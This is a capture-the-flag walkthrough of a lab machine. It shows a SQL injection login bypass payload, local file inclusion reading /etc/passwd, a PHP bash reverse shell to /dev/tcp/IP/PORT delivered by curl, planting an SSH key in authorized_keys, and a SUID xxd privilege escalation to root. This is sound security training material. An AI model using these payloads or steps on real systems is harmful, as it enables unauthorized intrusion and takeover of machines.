![Pasted image 20240927153835.png](../../IMAGES/Pasted%20image%2020240927153835.png)
This CTF contains a port scanning "block" method, since it show a lot of open ports in which most of services, are unavailable, for our luck, port 80 is open and has a login page:

![Pasted image 20240927153919.png](../../IMAGES/Pasted%20image%2020240927153919.png)
I tried different things such as `XSS` `LFI` `PATH TRAVERSAL` `BRUTEFORCE` and more, then when i tried `SQLI` I found a path to exploit, after trying multiple payloads, got with this one that worked for me:

`' || '1'='1';-- -`

Had to URL encode it:

`%27%20%7C%7C%20%271%27%3D%271%27%3B--%20-`

And it showed the following output:

![Pasted image 20240927154104.png](../../IMAGES/Pasted%20image%2020240927154104.png)

That location seems fun, lets visit it:

We got admin panel even without credentials:

![Pasted image 20240927154210.png](../../IMAGES/Pasted%20image%2020240927154210.png)
After looking for a while, I found that the request for messages, got me this message:

![Pasted image 20240927154349.png](../../IMAGES/Pasted%20image%2020240927154349.png)

Let's visit it:

![Pasted image 20240927154523.png](../../IMAGES/Pasted%20image%2020240927154523.png)

Nothing too useful, but then, looking at the URL I thought about a `LFI`, when i sent the request, i got this:

![Pasted image 20240927154621.png](../../IMAGES/Pasted%20image%2020240927154621.png)
I was able to read `etc/passwd` file, this website is vulnerable to `LFI`, let's get a reverse shell:

For this, i will be using the following tool:

```github
https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py`
```

Also, a simple php reverse shell, i will store it in a file called payload.txt: 

```php
"<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/IP/PORT 0>&1\"'); ?>" | grep "^php" > payload.txt
```

Now, let's send the reverse shell and establish a connection to our machine:

###### Sending the payload
`curl "http://10.10.142.162/secret-script.php?file=$(cat payload.txt)"`

![Pasted image 20240927160128.png](../../IMAGES/Pasted%20image%2020240927160128.png)


![Pasted image 20240927160136.png](../../IMAGES/Pasted%20image%2020240927160136.png)
We got our reverse shell, let's make it stable using the [shell tricks](../../Commands/Shell%20Tricks/STABLE%20SHELL.md)::

![Pasted image 20240927160349.png](../../IMAGES/Pasted%20image%2020240927160349.png)
Now, we have an stable shell, let's look for privesc:

![Pasted image 20240927160513.png](../../IMAGES/Pasted%20image%2020240927160513.png)
We cannot read user.txt contents neither use sudo -l due to the lack of the password for the user, let's look at SUID files:

![Pasted image 20240927160551.png](../../IMAGES/Pasted%20image%2020240927160551.png)

Nothing useful too, let's keep enumerating the machine:

![Pasted image 20240927160737.png](../../IMAGES/Pasted%20image%2020240927160737.png)
in `/home/comte/.ssh` we can read and write authorized keys, let's put ours:

![Pasted image 20240927161025.png](../../IMAGES/Pasted%20image%2020240927161025.png)
![Pasted image 20240927161221.png](../../IMAGES/Pasted%20image%2020240927161221.png)
I could enter ssh using my own key, let's read that `user.txt` file:

![Pasted image 20240927161301.png](../../IMAGES/Pasted%20image%2020240927161301.png)\

For privilege escalation we have this sudo permissions:

![Pasted image 20240927161701.png](../../IMAGES/Pasted%20image%2020240927161701.png)
When i read the `exploit.timer` file, I see this:

![Pasted image 20240927161722.png](../../IMAGES/Pasted%20image%2020240927161722.png)
Let's change the `OnBootSec` to 5 seconds and enable the service to see what it does:

![Pasted image 20240927161803.png](../../IMAGES/Pasted%20image%2020240927161803.png)
![Pasted image 20240927162007.png](../../IMAGES/Pasted%20image%2020240927162007.png)
Once I did this, I found that a new binary was added to the 4000 UID binaries, let's exploit `xxd` to gain root shell:

![Pasted image 20240927162104.png](../../IMAGES/Pasted%20image%2020240927162104.png)

![Pasted image 20240927162740.png](../../IMAGES/Pasted%20image%2020240927162740.png)
Now, i got root authorized key access:

![Pasted image 20240927162817.png](../../IMAGES/Pasted%20image%2020240927162817.png)
just like that, machine is done:

![Pasted image 20240927162856.png](../../IMAGES/Pasted%20image%2020240927162856.png)


